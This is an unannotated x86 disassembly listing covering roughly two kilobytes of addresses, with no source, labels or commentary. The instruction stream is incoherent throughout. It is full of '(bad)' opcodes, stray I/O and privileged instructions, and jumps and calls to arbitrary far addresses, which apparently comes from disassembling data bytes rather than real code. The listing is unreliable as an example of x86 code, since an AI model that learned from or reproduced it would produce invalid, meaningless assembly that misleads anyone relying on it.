  41fd7c:	jp     0x41fd5d
  41fd7e:	out    dx,al
  41fd7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd80:	push   esi
  41fd81:	repnz lock mov ch,0x44
  41fd85:	xor    bh,BYTE PTR [esi]
  41fd87:	pop    ebx
  41fd88:	out    0x3,eax
  41fd8a:	ds mov esp,0xb839e1e7
  41fd90:	out    0x31,eax
  41fd92:	ds arpl di,sp
  41fd95:	xor    eax,0xe900623e
  41fd9a:	sbb    ebx,DWORD PTR ds:0xe92c
	...
  41fdc8:	push   esp
  41fdc9:	pop    ebx
  41fdca:	(bad)  
  41fdcb:	jmp    0xe9775919
  41fdd0:	pop    eax
  41fdd1:	pop    ebx
  41fdd2:	xor    al,0xe9
  41fdd4:	push   ds
  41fdd5:	sbb    eax,0x5b34e961
  41fdda:	sub    ebp,ecx
  41fddc:	fcomp  QWORD PTR [edx+esi*1]
  41fddf:	jmp    0xe97a5914
  41fde4:	adc    BYTE PTR [ebx+0x61],bl
  41fde7:	jmp    0xe97458fb
  41fdec:	adc    al,0x5b
  41fdee:	xor    cl,ch
  41fdf0:	adc    DWORD PTR [ebx+0x64],ebx
  41fdf3:	jmp    0xe9a21ad7
  41fdf8:	jb     0x41fe55
  41fdfa:	jmpw   0x5968
  41fdfe:	add    cl,ch
  41fe00:	js     0x41fdb7
  41fe02:	popa   
  41fe03:	mov    ebx,0xc76dab92
  41fe08:	xchg   ecx,eax
  41fe09:	jg     0x41fe60
  41fe0b:	nop
  41fe0c:	mov    ds:0x91846e95,eax
  41fe11:	jg     0x41fe3d
  41fe13:	jmp    0xd3b2a6b3
  41fe18:	sub    ch,BYTE PTR [esi+0x0]
  41fe1b:	call   0xaa5c:0x7674b662
  41fe22:	arpl   WORD PTR [ebp-0x74924784],dx
  41fe28:	pusha  
  41fe29:	add    BYTE PTR [ecx+0x56],0x0
	...
  41fe55:	add    BYTE PTR [edi-0x4f],ah
  41fe58:	ins    DWORD PTR es:[edi],dx
  41fe59:	dec    edi
  41fe5a:	inc    edx
  41fe5b:	mov    ah,BYTE PTR [edi+0x5d]
  41fe5e:	pop    edi
  41fe5f:	mov    esp,DWORD PTR [ebx+0x5b]
  41fe62:	sub    al,0xb9
  41fe64:	jb     0x41fe66
  41fe66:	je     0x41febf
  41fe68:	dec    edi
  41fe69:	imul   esi,DWORD PTR [ebx+0x3a],0x29656550
  41fe70:	bound  esi,QWORD PTR [edx+0x47]
  41fe73:	jp     0x41fed9
  41fe75:	pop    esp
  41fe76:	dec    edi
  41fe77:	xor    BYTE PTR [eax+0x74],dh
  41fe7a:	pop    ss
  41fe7b:	add    eax,0x4327466
  41fe80:	bound  esi,QWORD PTR [edx+0x51]
  41fe83:	cmp    ch,BYTE PTR [edi+0x20]
  41fe86:	add    bh,ah
  41fe88:	pop    eax
  41fe89:	push   edi
  41fe8a:	inc    edx
  41fe8b:	xor    eax,0x573b7252
  41fe90:	dec    edi
  41fe91:	imul   edx,ebx,0xf565503a
  41fe97:	sub    DWORD PTR [edx+0x72],esp
  41fe9a:	aaa    
  41fe9b:	jp     0x41ff01
  41fe9d:	pop    esp
  41fe9e:	test   DWORD PTR [edx],edi
  41fea0:	push   0x6f
  41fea2:	xchg   ebx,eax
  41fea3:	cmp    bl,BYTE PTR ds:0x62258e44
  41fea9:	arpl   bx,si
  41feab:	xor    BYTE PTR [edi+0x79],ch
  41feae:	xchg   edi,eax
  41feaf:	add    al,0x66
  41feb1:	je     0x41fe35
  41feb3:	add    al,0x62
  41feb5:	jb     0x41fe68
  41feb7:	cmp    ch,BYTE PTR [edi+0x20]
	...
  41fee2:	add    BYTE PTR [eax],al
  41fee4:	cmp    bl,0x29
  41fee7:	push   ebp
  41fee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fee9:	cmp    ch,BYTE PTR [edi+0x0]
  41feec:	mov    ah,0x2e
  41feee:	jno    0x41ff55
  41fef0:	aam    0x3a
  41fef2:	outs   dx,DWORD PTR ds:[esi]
  41fef3:	jbe    0x41feb7
  41fef5:	and    eax,0x72b3251d
  41fefa:	push   ecx
  41fefb:	jae    0x41febf
  41fefd:	and    eax,0x5710501d
  41ff02:	and    DWORD PTR [ebx+0xb],esi
  41ff05:	or     al,0x62
  41ff07:	jns    0x41ff47
  41ff09:	xchg   ecx,eax
  41ff0a:	in     al,dx
  41ff0b:	pop    esi
  41ff0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff0d:	pop    edx
  41ff0e:	add    al,0x51
  41ff10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff11:	pop    eax
  41ff12:	fist   WORD PTR [eax-0x5d]
  41ff15:	push   esi
  41ff16:	repnz bound ebp,QWORD PTR [esp+eiz*2+0x757a641f]
  41ff1e:	ret    0x6e53
  41ff21:	add    al,0xbd
  41ff23:	bound  ebx,QWORD PTR [edx+0x7862fc6f]
  41ff29:	pop    eax
  41ff2a:	aam    0xff
  41ff2c:	ins    BYTE PTR es:[edi],dx
  41ff2d:	pop    ebx
  41ff2e:	lock bound ebp,QWORD PTR [ebp+0x32]
  41ff32:	stc    
  41ff33:	push   0x5a
  41ff35:	add    al,0xd2
  41ff37:	bound  ebx,QWORD PTR [esp-0x43]
  41ff3b:	pop    esi
  41ff3c:	push   edx
  41ff3d:	arpl   WORD PTR [esp+ecx*2],ax
  41ff40:	popa   
  41ff41:	sub    esp,ebp
  41ff43:	ins    DWORD PTR es:[edi],dx
  41ff44:	push   ds
  41ff45:	shl    bl,0x73
	...
  41ff70:	add    BYTE PTR [eax],al
  41ff72:	pop    edi
  41ff73:	add    al,0xd6
  41ff75:	dec    esi
  41ff76:	or     bl,BYTE PTR [ebx]
  41ff78:	in     eax,dx
  41ff79:	bound  ebx,QWORD PTR [esi+0x2a]
  41ff7c:	jmp    0x6d1f:0xed231b71
  41ff83:	add    al,0xed
  41ff85:	pop    esi
  41ff86:	sbb    al,0xd8
  41ff88:	(bad)  
  41ff8a:	pop    ecx
  41ff8b:	add    al,0x2c
  41ff8d:	add    BYTE PTR [esi+0x4],bl
  41ff90:	(bad)  
  41ff91:	dec    esp
  41ff92:	lock aam 0xcc
  41ff95:	push   ecx
  41ff96:	(bad)  
  41ff97:	mov    edx,0xf43e53c6
  41ff9c:	rol    BYTE PTR [esi-0x5],cl
  41ff9f:	ret    0x56d2
  41ffa2:	ds test esi,0xbfeeef46
  41ffa9:	(bad)  
  41ffaa:	cld    
  41ffab:	pop    edx
  41ffac:	das    
  41ffad:	mov    edi,0xc1e7a5fe
  41ffb2:	repnz lods al,BYTE PTR ds:[esi]
  41ffb4:	sub    al,0xcb
  41ffb6:	sub    BYTE PTR [ecx-0x755dfc19],0x4e
  41ffbd:	jmp    0x41ff5a
  41ffbf:	mov    fs,edi
  41ffc1:	call   0xeb908475
  41ffc6:	stos   DWORD PTR es:[edi],eax
  41ffc7:	mov    edx,0x5ba5f634
  41ffcc:	pop    ss
  41ffcd:	jecxz  0x41ff5d
  41ffcf:	mov    ss,WORD PTR [esi]
  41ffd1:	jmp    0xf2787f65
	...
  41fffe:	add    BYTE PTR [eax],al
  420000:	cwde   
  420001:	xchg   DWORD PTR [edi+ebx*8],edx
  420004:	icebp  
  420005:	mov    ?,edx
  420007:	fisubr WORD PTR [edi-0x77]
  42000a:	or     bh,ah
  42000c:	pop    esp
  42000d:	mov    edx,0x9065e2fd
  420012:	add    al,0x4
  420014:	pop    eax
  420015:	(bad)  
  420016:	xlat   BYTE PTR ds:[ebx]
  420017:	cmp    eax,0xebe74a1b
  42001c:	dec    ebp
  42001d:	(bad)  
  42001e:	xlat   BYTE PTR ds:[ebx]
  42001f:	cmp    eax,0xebe74a6b
  420024:	sub    eax,0x67f4b78f
  420029:	dec    edx
  42002a:	push   cs
  42002b:	add    al,0x2
  42002d:	mov    ds:0x8722e8c6,al
  420032:	(bad)  
  420033:	xlat   BYTE PTR ds:[ebx]
  420034:	inc    BYTE PTR [edx-0x7feb1767]
  42003a:	out    0xd7,eax
  42003c:	inc    BYTE PTR [edx-0x7c1b1767]
  420042:	xchg   esp,eax
  420043:	out    0x71,al
  420045:	mov    ch,0xaa
  420047:	jmp    0x420038
  420049:	mov    DWORD PTR [esi+ebx*8+0x7c0086f1],ecx
  420050:	push   edx
  420051:	sbb    DWORD PTR [edx+0x7e],edx
  420054:	pop    edi
  420055:	lea    esi,[ebp+0x48]
  420058:	push   eax
  420059:	jl     0x4200b7
  42005b:	sub    dl,BYTE PTR [edx-0x75]
  42005e:	ins    DWORD PTR es:[edi],dx
  42005f:	inc    esp
  420060:	sbb    DWORD PTR [ecx+0x546c],ebp
	...
  42008e:	sub    ebx,DWORD PTR [ecx]
  420090:	dec    eax
  420091:	push   edi
  420092:	xor    ecx,DWORD PTR [ebp-0x47e9b2a1]
  420098:	inc    esp
  420099:	inc    eax
  42009a:	adc    BYTE PTR [ecx],bl
  42009c:	pop    ecx
  42009d:	sub    ecx,DWORD PTR [eax]
  42009f:	mov    BYTE PTR [ebx+0x10],ch
  4200a2:	sbb    DWORD PTR [esi-0x7e0bc300],eax
  4200a8:	popa   
  4200a9:	add    eax,esi
  4200ab:	xchg   DWORD PTR [ebx+0x4],ebp
  4200ae:	cmp    dh,BYTE PTR [edi-0x781ee9bf]
  4200b4:	fs push cs
  4200b6:	cmp    dh,BYTE PTR [edi-0x7c1cf9ae]
  4200bc:	dec    ebx
  4200bd:	add    al,0xe6
  4200bf:	mov    WORD PTR [eax],es
  4200c1:	mov    dl,0x20
  4200c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200c4:	arpl   bp,cx
  4200c6:	loopne 0x42004f
  4200c8:	outs   dx,BYTE PTR ds:[esi]
  4200c9:	jmp    0x9c6da45f
  4200ce:	nop
  4200cf:	test   BYTE PTR [ebx-0x2a],ah
  4200d2:	xchg   edi,eax
  4200d3:	sbb    BYTE PTR [ecx-0x67],bl
  4200d6:	stos   DWORD PTR es:[edi],eax
  4200d7:	xchg   DWORD PTR [esi-0x40],esp
  4200da:	mov    eax,ds:0xd0e9717d
  4200df:	mov    BYTE PTR [edi-0x76],ah
  4200e2:	cmp    eax,0x949943b7
  4200e7:	jnp    0x420145
  4200e9:	lods   al,BYTE PTR ds:[esi]
  4200ea:	ins    DWORD PTR es:[edi],dx
  4200eb:	and    DWORD PTR [ecx-0x17],0x5f8c8a
	...
  42011a:	add    BYTE PTR [eax],al
  42011c:	mov    ecx,0xcb4629fa
  420121:	sub    al,0xfd
  420123:	jb     0x4200e3
  420125:	or     BYTE PTR [edx+0x73],ah
  420128:	xchg   ecx,eax
  420129:	add    eax,0x3057696b
  42012e:	push   eax
  42012f:	imul   ebp,ebx,0x73006ff9
  420135:	sub    DWORD PTR [esi+0x73],esp
  420138:	jle    0x420136
  42013a:	imul   ebp,DWORD PTR [ebp+0x37],0x22
  42013e:	bound  esp,QWORD PTR [esi+ecx*4-0x2]
  420142:	cld    
  420143:	sub    eax,0x6d0b89
  420148:	xor    al,0x5f
  42014a:	popa   
  42014b:	add    BYTE PTR [ebx],ch
  42014d:	pop    edi
  42014e:	je     0x420150
  420150:	cs pop edi
  420152:	outs   dx,BYTE PTR ds:[esi]
  420153:	add    BYTE PTR [eax+0x5f],cl
  420156:	outs   dx,DWORD PTR ds:[esi]
  420157:	add    bh,ah
  420159:	pop    ebx
  42015a:	pop    esp
  42015b:	inc    edi
  42015c:	push   ebx
  42015d:	add    BYTE PTR [edi+0x61],bl
  420160:	xor    edi,DWORD PTR [edi]
  420162:	inc    esp
  420163:	outs   dx,DWORD PTR ds:[esi]
  420164:	fdivr  st,st(5)
  420166:	push   0x61fb466f
  42016b:	jb     0x420144
  42016d:	sub    al,0x4a
  42016f:	test   BYTE PTR cs:[ecx],0x60
  420173:	push   0x656ed5a7
  420178:	xchg   esp,eax
  420179:	add    eax,DWORD PTR [ebx+0x54]
  42017c:	(bad)  
  42017d:	pop    ebx
  42017e:	cs push ebx
	...
  4201a8:	add    BYTE PTR [eax],al
  4201aa:	rcl    ch,cl
  4201ac:	cld    
  4201ad:	inc    ecx
  4201ae:	cmp    esi,0x76
  4201b1:	fld    DWORD PTR gs:[edi]
  4201b4:	ins    DWORD PTR es:[edi],dx
  4201b5:	add    BYTE PTR [esi+eax*1+0x37716571],ah
  4201bc:	pop    esi
  4201bd:	je     0x4201fd
  4201bf:	add    al,ch
  4201c1:	pop    esi
  4201c2:	in     eax,dx
  4201c3:	in     eax,dx
  4201c4:	rcr    BYTE PTR [esi-0x13],1
  4201c7:	xchg   esp,eax
  4201c8:	out    dx,al
  4201c9:	ins    BYTE PTR es:[edi],dx
  4201ca:	in     al,dx
  4201cb:	fld    QWORD PTR [eax]
  4201cd:	dec    esp
  4201ce:	fist   WORD PTR [ebp+ebp*8-0x112225c2]
  4201d5:	(bad)  
  4201d6:	int    0xb4
  4201d8:	add    al,0x4c
  4201da:	fbstp  TBYTE PTR [eax+esi*8-0xd5852ae]
  4201e1:	inc    DWORD PTR [ebp-0x718c0e5d]
  4201e7:	lods   eax,DWORD PTR ds:[esi]
  4201e8:	bnd jae 0x420229
  4201eb:	jno    0x4201d2
  4201ed:	gs xchg edx,eax
  4201ef:	push   ebp
  4201f0:	jecxz  0x420263
  4201f2:	fwait
  4201f3:	push   0x719f6bbe
  4201f8:	in     al,dx
  4201f9:	dec    edi
  4201fa:	fwait
  4201fb:	arpl   cx,bp
  4201fd:	pop    ebx
  4201fe:	jl     0x420260
  420200:	jecxz  0x42027b
  420202:	pop    ebx
  420203:	lock outs dx,DWORD PTR ds:[esi]
  420206:	mov    dh,BYTE PTR [ecx-0x21]
  420209:	jae    0x420275
  42020b:	imul   esp,esi,0x64
	...
  420236:	add    BYTE PTR [eax],al
  420238:	dec    ebp
  420239:	add    al,0xd5
  42023b:	inc    ecx
  42023c:	bound  esp,QWORD PTR [ebx-0x6]
  42023f:	bound  eax,QWORD PTR [eax+0x13fff138]
  420245:	push   ds
  420246:	icebp  
  420247:	imul   edi,DWORD PTR [esi],0xffffffc6
  42024a:	int3   
  42024b:	dec    edi
  42024c:	gs pop ecx
  42024e:	es dec esp
  420250:	pop    ss
  420251:	cs jmp 0x2a6b:0xe02c2d5b
  420259:	lock in eax,0x6f
  42025c:	sbb    edx,esi
  42025e:	aam    0x60
  420260:	sbb    DWORD PTR [ebx-0x6c],ebx
  420263:	call   0x3c58748
  420268:	add    eax,DWORD PTR [esi+0x5b01cfad]
  42026e:	stos   BYTE PTR es:[edi],al
  42026f:	out    0xdb,al
  420271:	test   BYTE PTR [edx+eiz*8-0x1a717c13],cl
  420278:	into   
  420279:	inc    esp
  42027a:	jnp    0x420277
  42027c:	int    0x5a
  42027e:	mov    edx,0x3b9d14bf
  420283:	aam    0x41
  420285:	mov    DWORD PTR [eax-0x10],edx
  420288:	pushf  
  420289:	mov    al,BYTE PTR ds:0xe784a3eb
  42028f:	xlat   BYTE PTR ds:[ebx]
  420290:	outs   dx,BYTE PTR ds:[esi]
  420291:	lahf   
  420292:	adc    al,0xbe
  420294:	lea    ebp,[ebx-0x7b912819]
  42029a:	cmp    ebx,edi
	...
  4202c4:	add    BYTE PTR [eax],al
  4202c6:	jge    0x420248
  4202c8:	cmp    ch,bl
  4202ca:	mov    ds:0x1f20c85,al
  4202cf:	test   eax,0xae8dbe2e
  4202d4:	sub    dl,dl
  4202d6:	jl     0x42028f
  4202d8:	sub    ch,al
  4202da:	mov    BYTE PTR [edx-0x48912106],cl
  4202e0:	adc    edi,ebx
  4202e2:	imul   eax,DWORD PTR [eax-0x48a014dd],0x4b10bdf2
  4202ec:	sbb    esi,DWORD PTR [ecx]
  4202ee:	jg     0x420343
  4202f0:	pop    ds
  4202f1:	daa    
  4202f2:	add    BYTE PTR [ebp-0x53],cl
  4202f5:	xor    DWORD PTR [ebp+0x4c],esp
  4202f8:	pop    ss
  4202f9:	xor    ebp,DWORD PTR [ecx+0x48]
  4202fc:	test   al,0x30
  4202fe:	call   DWORD PTR [ebx+0xc]
  420301:	xor    al,0x56
  420303:	dec    ebx
  420304:	add    cl,bh
  420306:	dec    edi
  420307:	cdq    
  420308:	xor    ah,BYTE PTR [edi-0x54b9b1a7]
  42030e:	mov    BYTE PTR [ecx-0x48d030d1],dh
  420314:	xor    BYTE PTR [ebp-0x2591839e],dh
  42031a:	das    
  42031b:	pop    ebx
  42031c:	inc    ebx
  42031d:	mov    BYTE PTR [esi-0x74],ch
  420320:	inc    esi
  420321:	xchg   ebp,eax
  420322:	ins    DWORD PTR es:[edi],dx
  420323:	adc    eax,0x8970a759
  420328:	push   ecx
  420329:	mov    BYTE PTR [eax],al
	...
  420353:	add    BYTE PTR [edi-0x4c],cl
  420356:	outs   dx,BYTE PTR ds:[esi]
  420357:	dec    esi
  420358:	cmp    al,BYTE PTR [ebp+0x78]
  42035b:	inc    edi
  42035c:	xor    dl,BYTE PTR ds:0x851e5b2b
  420362:	add    BYTE PTR ds:0x1a4baae9,dh
  420368:	or     al,0xaf
  42036a:	sub    eax,0x5f8b4213
  42036f:	cmp    cl,BYTE PTR [edi]
  420371:	nop
  420372:	ins    DWORD PTR es:[edi],dx
  420373:	cmp    ebx,DWORD PTR [esi]
  420375:	jne    0x4203aa
  420377:	fadd   DWORD PTR [edi+0x79]
  42037a:	cmp    ch,cl
  42037c:	call   0xd85d670c
  420381:	mov    ch,0x6b
  420383:	add    al,0x24
  420385:	mov    bh,BYTE PTR [edx]
  420387:	jmp    0xdae8d8f
  42038c:	and    dh,BYTE PTR [esp+eiz*2+0x7179cc0d]
  420393:	cli    
  420394:	pop    es
  420395:	mov    bh,BYTE PTR [edx]
  420397:	jmp    0xa4965eb7
  42039c:	(bad)  
  42039d:	mov    eax,ds:0x4783bb51
  4203a2:	add    BYTE PTR [edi+0x20a479],ah
  4203a8:	jmp    0xe14277ac
  4203ad:	and    al,0x4d
  4203af:	dec    esi
  4203b0:	js     0x4203b9
  4203b2:	std    
  4203b3:	jb     0x420433
  4203b5:	add    al,0x62
  4203b7:	jae    0x4203b9
	...
  4203e1:	add    BYTE PTR [ecx+0x10],ch
  4203e4:	push   0x6c
  4203e6:	sub    ecx,DWORD PTR [si+0x46]
  4203ea:	mov    bl,0x27
  4203ec:	ds push edx
  4203ee:	mov    ds:0xb56f4f2c,al
  4203f3:	jmp    FWORD PTR [ecx]
  4203f5:	inc    esi
  4203f6:	mov    bl,0x28
  4203f8:	sbb    eax,0x5c477933
  4203fd:	push   ebx
  4203fe:	mov    ah,0xa
  420400:	data16 jo 0x4203e6
  420403:	or     edi,ebp
  420405:	push   edx
  420406:	push   0x66575121
  42040b:	sub    eax,0xf8655c42
  420410:	pop    esi
  420411:	outs   dx,DWORD PTR ds:[esi]
  420412:	dec    edx
  420413:	and    DWORD PTR [ecx+0x50],edx
  420416:	inc    edi
  420417:	dec    esp
  420418:	cs aaa 
  42041a:	sub    esp,DWORD PTR [ecx]
  42041c:	push   ecx
  42041d:	push   eax
  42041e:	and    al,0x2
  420420:	outs   dx,DWORD PTR ds:[esi]
  420421:	jbe    0x420455
  420423:	or     eax,0x33210070
  420428:	dec    ebp
  420429:	and    BYTE PTR [eax+edi*8],ah
  42042c:	jno    0x42049c
  42042e:	push   ebx
  42042f:	pop    edi
  420430:	inc    esi
  420431:	push   esp
  420432:	inc    edi
  420433:	aas    
  420434:	inc    esi
  420435:	imul   ecx,DWORD PTR [ebx+0x2],0x27e76422
  42043c:	pop    esi
  42043d:	jae    0x420403
  42043f:	adc    BYTE PTR [edx+esi*2-0xd],ch
  420443:	push   edi
  420444:	dec    edi
  420445:	add    BYTE PTR gs:[eax],al
	...
  420470:	xchg   ebp,eax
  420471:	adc    DWORD PTR [edx+0x72],esp
  420474:	ds mov esp,0x2236ae3
  42047a:	fdiv   DWORD PTR [eax+0x1b]
  42047d:	sar    BYTE PTR [ebx-0x2134c1bd],1
  420483:	data16 or bl,BYTE PTR [ebx]
  420486:	in     al,0x6b
  420488:	add    bl,BYTE PTR [ebx]
  42048a:	repz bound ebx,QWORD PTR ds:0xf771e1f6
  420491:	add    ecx,edx
  420493:	ins    BYTE PTR es:[edi],dx
  420494:	in     al,dx
  420495:	cmc    
  420496:	mov    esi,0xe7dfdb72
  42049b:	jno    0x4204db
  42049d:	icebp  
  42049e:	out    0x71,eax
  4204a0:	rcr    dh,1
  4204a2:	repnz push ebx
  4204a4:	xlat   BYTE PTR ds:[ebx]
  4204a5:	xchg   ecx,eax
  4204a6:	call   0x1443eaa
  4204ab:	add    BYTE PTR [ebp-0x58003c57],ah
  4204b1:	xchg   edi,eax
  4204b2:	xchg   ebx,eax
  4204b3:	jnp    0x420474
  4204b5:	inc    ecx
  4204b6:	shr    BYTE PTR [eax+esi*8],0xcb
  4204ba:	or     DWORD PTR [eax+0x66562026],esp
  4204c0:	mov    edi,DWORD PTR [ebx]
  4204c2:	add    al,0x32
  4204c4:	pusha  
  4204c5:	nop    DWORD PTR [edx]
  4204c8:	inc    edi
  4204c9:	adc    dh,BYTE PTR [esi]
  4204cb:	xor    eax,0x5fb343e
  4204d0:	inc    esi
  4204d1:	sub    eax,0xff07
	...
  4204fe:	cmp    bh,bh
  420500:	or     DWORD PTR [ecx],eax
  420502:	cmp    eax,0x586cd604
  420507:	adc    dl,bh
  420509:	pop    esi
  42050a:	dec    esp
  42050b:	push   edi
  42050c:	ror    BYTE PTR [ebx+0x67],1
  42050f:	pop    edx
  420510:	jecxz  0x420582
  420512:	sub    BYTE PTR [eax-0x2c],0x5b
  420516:	ins    DWORD PTR es:[edi],dx
  420517:	pop    ebx
  420518:	shl    bh,1
  42051a:	sbb    al,0x3b
  42051c:	lods   al,BYTE PTR ds:[esi]
  42051d:	in     al,0x23
  42051f:	jl     0x4204ef
  420521:	call   0xe2e16055
  420526:	cs xchg edi,esp
  420529:	fmul   DWORD PTR [esi]
  42052b:	js     0x4204e6
  42052d:	add    ebp,esi
  42052f:	jnp    0x4204eb
  420531:	test   BYTE PTR [ecx+0xdf5bea2],0x5b
  420538:	mov    ecx,0x9381e4e8
  42053d:	call   0xf5c29c93
  420542:	imul   esi,DWORD PTR [esi+0x77dfecaa],0x7dcce779
  42054c:	xchg   edx,eax
  42054d:	add    esp,DWORD PTR [eax]
  42054f:	ja     0x4205cd
  420551:	out    0xd6,al
  420553:	pop    edx
  420554:	je     0x42054c
  420556:	fmul   QWORD PTR [ebp+edx*1+0x4581aae5]
  42055d:	fistp  DWORD PTR [edx+0xf5135b]
	...
  42058b:	add    BYTE PTR [edi+eax*4+0x7a93db53],bl
  420592:	pop    es
  420593:	loop   0x42060d
  420595:	add    BYTE PTR [edi+ebp*1+0x5c],0x5b
  42059a:	or     DWORD PTR [eax+edx*4],eax
  42059d:	jl     0x4205da
  42059f:	neg    DWORD PTR [eax+edx*2-0x7d70fc37]
  4205a6:	add    eax,0x197c6af8
  4205ab:	out    0x85,eax
  4205ad:	scas   al,BYTE PTR es:[edi]
  4205ae:	add    bh,bl
  4205b0:	push   edx
  4205b1:	sbb    DWORD PTR [ebx],0x8834de3
  4205b7:	fbstp  TBYTE PTR [ebp-0x55]
  4205ba:	add    ah,bh
  4205bc:	icebp  
  4205bd:	lods   eax,DWORD PTR ds:[esi]
  4205be:	push   edi
  4205bf:	or     eax,0xda717ceb
  4205c4:	xchg   esp,eax
  4205c5:	jle    0x420635
  4205c7:	fidivr DWORD PTR ds:0xb1da6da3
  4205cd:	lahf   
  4205ce:	pop    edi
  4205cf:	mov    esp,0xba541198
  4205d4:	mov    al,ds:0x70c84e8b
  4205d9:	jl     0x4205db
  4205db:	cdq    
  4205dc:	pushf  
  4205dd:	mov    dh,BYTE PTR [ecx-0x4a]
  4205e0:	sahf   
  4205e1:	mov    esp,DWORD PTR [ecx+ebp*8-0x73]
  4205e5:	jle    0x420659
  4205e7:	xchg   ebp,eax
  4205e8:	jg     0x420576
  4205ea:	imul   ecx,DWORD PTR [ebx-0x4aff74a0],0x0
	...
  420619:	add    BYTE PTR [eax-0x75],bl
  42061c:	imul   edx,DWORD PTR [eax-0x6a934fa1],0x64
  420623:	and    DWORD PTR [ebx-0x17],0xa770817f
  42062a:	imul   esp,DWORD PTR [ecx-0x7ae69ed2],0x7ffc3d00
  420634:	je     0x420682
  420636:	xor    dh,BYTE PTR [edx+0x5b430264]
  42063c:	push   ecx
  42063d:	push   esi
  42063e:	and    al,0x8d
  420640:	jne    0x42068a
  420642:	or     BYTE PTR [esi+0x5c],bh
  420645:	sub    bl,BYTE PTR [edi]
  420647:	ja     0x4206af
  420649:	inc    esp
  42064a:	sbb    DWORD PTR [ebx+esi*2+0x6daa2219],ebx
  420651:	pop    es
  420652:	test   BYTE PTR [edi+0x10e11b5f],0x43
  420659:	xor    eax,0x64710a
  42065e:	dec    edx
  42065f:	push   es
  420660:	jno    0x4206cb
  420662:	inc    ecx
  420663:	cld    
  420664:	jo     0x4206cf
  420666:	inc    eax
  420667:	std    
  420668:	sbb    al,0x73
  42066a:	cmp    cl,BYTE PTR [ecx]
  42066c:	jae    0x4206d3
  42066e:	xchg   ebp,eax
  42066f:	pop    esp
  420670:	inc    esi
  420671:	push   esp
  420672:	idiv   DWORD PTR [esp+eiz*2]
  420675:	test   BYTE PTR gs:[eax],cl
  420678:	data16 outs dx,BYTE PTR ds:[esi]
  42067a:	jbe    0x420684
  42067c:	outs   dx,WORD PTR ds:[esi]
	...
  4206a6:	add    BYTE PTR [eax],al
  4206a8:	jno    0x4206e6
  4206aa:	jno    0x42071f
  4206ac:	jp     0x4206b4
  4206ae:	std    
  4206af:	inc    ebp
  4206b0:	stos   DWORD PTR es:[edi],eax
  4206b1:	sub    al,0x1d
  4206b3:	fs jp  0x4206bd
  4206b6:	jno    0x420721
  4206b8:	sar    ebp,1
  4206ba:	jo     0x420725
  4206bc:	sar    dl,0x1c
  4206bf:	jo     0x420677
  4206c1:	pop    es
  4206c2:	jo     0x42073b
  4206c4:	loopne 0x4206cb
  4206c6:	popa   
  4206c7:	add    BYTE PTR [ecx-0x44dfb2d8],ch
  4206cd:	stc    
  4206ce:	outs   dx,DWORD PTR ds:[esi]
  4206cf:	je     0x42068f
  4206d1:	cli    
  4206d2:	pop    ebp
  4206d3:	je     0x420693
  4206d5:	sti    
  4206d6:	push   0x20
  4206d8:	xchg   edi,eax
  4206d9:	xor    BYTE PTR [edi+0x74],ch
  4206dc:	daa    
  4206dd:	push   ss
  4206de:	push   ecx
  4206df:	push   eax
  4206e0:	aaa    
  4206e1:	add    esp,DWORD PTR [edx+0x73]
  4206e4:	mov    ebp,DWORD PTR [esi]
  4206e6:	imul   esp,DWORD PTR [ecx+0x5b],0x2e
  4206ea:	ins    BYTE PTR es:[edi],dx
  4206eb:	outs   dx,BYTE PTR ds:[esi]
  4206ec:	inc    edi
  4206ed:	cld    
  4206ee:	pop    ebp
  4206ef:	je     0x420767
  4206f1:	sti    
  4206f2:	imul   esp,DWORD PTR [edi+0x17],0x16
  4206f6:	push   ecx
  4206f7:	push   eax
  4206f8:	pop    es
  4206f9:	or     al,0x6f
  4206fb:	outs   dx,DWORD PTR ds:[esi]
  4206fc:	cmp    DWORD PTR [esi],ebp
  4206fe:	imul   esp,DWORD PTR [ebp+0x3e],0x8a460475
  420705:	push   edx
  420706:	shl    DWORD PTR [edi+0x63],1
  420709:	data16 loopne 0x42070b
	...
  420734:	add    BYTE PTR [eax],al
  420736:	pop    ebx
  420737:	push   es
  420738:	icebp  
  420739:	jo     0x420791
  42073b:	pop    edi
  42073c:	loopne 0x4207a9
  42073e:	adc    BYTE PTR [eax-0xf],bl
  420741:	data16 ds aad 0xdd
  420745:	sub    ch,BYTE PTR gs:[ecx]
  420748:	in     al,0x71
  42074a:	and    eax,esi
  42074c:	mov    edi,0xd20f0d3e
  420751:	ins    BYTE PTR es:[edi],dx
  420752:	and    dh,cl
  420754:	int3   
  420755:	inc    ebp
  420756:	jmp    0xcd19:0x206dbbf1
  42075d:	push   eax
  42075e:	sbb    eax,esi
  420760:	imul   DWORD PTR [edi+0x3e]
  420763:	mov    esi,0xb5df73e3
  420768:	(bad)  [ecx+0x3e]
  42076b:	mov    dl,0x53
  42076e:	push   cs
  42076f:	mov    ebx,0x1e965da
  420774:	shl    BYTE PTR [edx-0x34],cl
  420777:	xchg   eax,ebp
  420779:	jno    0x420775
  42077b:	(bad)  
  42077d:	jae    0x42078f
  42077f:	mov    ah,al
  420781:	imul   edi,DWORD PTR [esi],0x46
  420784:	out    0x77,eax
  420786:	stos   DWORD PTR es:[edi],eax
  420787:	mov    cl,0xc6
  420789:	call   0xaa66:0x49f
  42078f:	mov    ah,0xf1
  420791:	xchg   dx,ax
  420793:	lahf   
  420794:	push   ds
  420795:	addr16 mov al,ds:0x4ab
  420799:	inc    esi
	...
  4207c2:	add    BYTE PTR [eax],al
  4207c4:	lahf   
  4207c5:	push   ecx
  4207c6:	clc    
  4207c7:	push   eax
  4207c8:	mov    cl,BYTE PTR [ebp-0x22]
  4207cb:	bound  ebx,QWORD PTR [esi]
  4207cd:	pop    ebx
  4207ce:	sub    edx,esi
  4207d0:	bound  eax,QWORD PTR [esi+0x5b6fe91a]
  4207d6:	sub    eax,0x9f71d8
  4207db:	repz dec ebp
  4207dd:	cmp    eax,0xb2d1e20b
  4207e2:	sub    al,0xe5
  4207e4:	pop    ecx
  4207e5:	jg     0x4207f3
  4207e7:	ror    DWORD PTR [ebp-0x78],cl
  4207ea:	add    ebx,ebp
  4207ec:	sub    ch,BYTE PTR [edi+0x7e2fdbaa]
  4207f2:	int3   
  4207f3:	call   0xf31e86f1
  4207f8:	mov    eax,ds:0xde5bea9
  4207fd:	xchg   al,cl
  4207ff:	icebp  
